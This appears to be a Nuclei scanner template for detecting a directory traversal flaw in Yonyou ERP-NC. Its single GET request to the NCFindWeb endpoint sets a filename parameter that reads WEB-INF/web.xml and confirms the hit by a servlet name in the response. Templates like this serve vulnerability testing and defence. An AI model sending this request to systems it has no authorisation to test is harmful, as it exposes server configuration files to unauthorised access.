id: yongyou-fileRead

info:
  name: 用友ERP-NC 目录遍历漏洞
  author: str1am
  severity: high
  tags: yongyou

requests:
  - method: GET
    path:
      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<servlet-name>NCInvokerServlet</servlet-name>"
        part: body
        condition: and
